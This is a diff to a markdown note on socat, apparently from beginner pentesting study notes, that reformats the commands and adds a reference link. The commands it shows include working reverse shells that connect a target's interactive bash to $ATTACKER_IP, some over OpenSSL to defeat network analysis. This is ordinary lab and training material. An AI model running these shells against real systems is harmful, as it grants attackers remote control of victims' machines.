@@ -4,7 +4,7 @@ Socat: An anything-to-anything connector!
 
 ## “socat” vs. “netcat”
 
-Equivalent commands between socat and [netcat](netcat.md):
+Equivalent commands between socat and netcat:
 
 | Role                     | netcat                                   | socat                                                  |
 |:------------------------ |:---------------------------------------- |:------------------------------------------------------ |
@@ -22,7 +22,9 @@ Socat can also make encrypted connections, which foil after-the-fact network ana
 ```bash
 # Generate a self-signed certificate.
 #
-openssl req --newkey rsa:2048 -nodes -keyout shell.key -x509 -days 362 -out shell.crt
+openssl req --newkey rsa:2048 -nodes \
+            -keyout shell.key -x509 -days 362 \
+            -out shell.crt
 
 # Create a PEM file combining the certificate and key.
 #
@@ -30,11 +32,14 @@ cat shell.key shell.crt > shell.pem
 
 # Start a listener.
 #
-socat OPENSSL-LISTEN:$LISTENER_PORT,cert=shell.pem,verify=0 -
+socat \
+	OPENSSL-LISTEN:$LISTENER_PORT,cert=shell.pem,verify=0 -
 
 # Start the reverse shell on the target.
 #
-socat OPENSSL:$ATTACKER_IP:$LISTENER_PORT,verify=0 EXEC:"/bin/bash -li"
+socat \
+	OPENSSL:$ATTACKER_IP:$LISTENER_PORT,verify=0 \
+	EXEC:"/bin/bash -li"
 ```
 
 The `verify=0` directive turns off certificate validation, so this isn’t a “secure” connection in the sense that it’s been *authenticated*, but it is secure in the sense that it’s *encrypted*.
@@ -47,8 +52,8 @@ We can use socat to create an auto-stabilized reverse shell on UNIX-like systems
 
 ```bash
 # Attacker: Connect $LISTENER_PORT to the current TTY,
-# send raw keycodes, and turn off terminal echo. Basically
-# the `stty raw -echo`.
+# send raw keycodes, and turn off terminal echo.
+# Basically the `stty raw -echo`.
 #
 socat TCP-LISTEN:$LISTENER_PORT FILE:`tty`,raw,echo=0
 
@@ -62,7 +67,8 @@ socat TCP-LISTEN:$LISTENER_PORT FILE:`tty`,raw,echo=0
 #     sane   - use a variety of tweaks to “normalize” the
 #              terminal’s environment
 #
-socat TCP:$ATTACKER_IP:$LISTENER_PORT EXEC:"/bin/bash -li",pty,stderr,sigint,setsid,sane
+socat TCP:$ATTACKER_IP:$LISTENER_PORT \
+      EXEC:"/bin/bash -li",pty,stderr,sigint,setsid,sane
 ```
 
 Same thing, but over an encrypted connection:
@@ -72,7 +78,9 @@ Same thing, but over an encrypted connection:
 # send raw keycodes, and turn off terminal echo. Basically
 # the `stty raw -echo`.
 #
-socat OPENSSL-LISTEN:$LISTENER_PORT,cert=$PEM_FILE,verify=0 FILE:`tty`,raw,echo=0
+socat \
+	OPENSSL-LISTEN:$LISTENER_PORT,cert=$PEM_FILE,verify=0 \
+	FILE:`tty`,raw,echo=0
 
 # Target: Connect the listener on the attacker to an
 # interactive login bash shell.
@@ -84,7 +92,9 @@ socat OPENSSL-LISTEN:$LISTENER_PORT,cert=$PEM_FILE,verify=0 FILE:`tty`,raw,echo=
 #     sane   - use a variety of tweaks to “normalize” the
 #              terminal’s environment
 #
-socat OPENSSL:$ATTACKER_IP:$LISTENER_PORT,verify=0 EXEC:"/bin/bash -li",pty,stderr,sigint,setsid,sane
+socat \
+	OPENSSL:$ATTACKER_IP:$LISTENER_PORT,verify=0 \
+	EXEC:"/bin/bash -li",pty,stderr,sigint,setsid,sane
 ```
 
 NOTE that the reverse shell will not pick up on your terminal size, so you’ll need to manually specify it using `stty rows` and `stty cols`.
@@ -92,6 +102,7 @@ NOTE that the reverse shell will not pick up on your terminal size, so you’ll 
 ## References
 
 * [TryHackMe: Complete Beginner](tryhackme-complete-beginner.md)
+* [Using “netcat”](netcat.md)
 
 - - - -
 
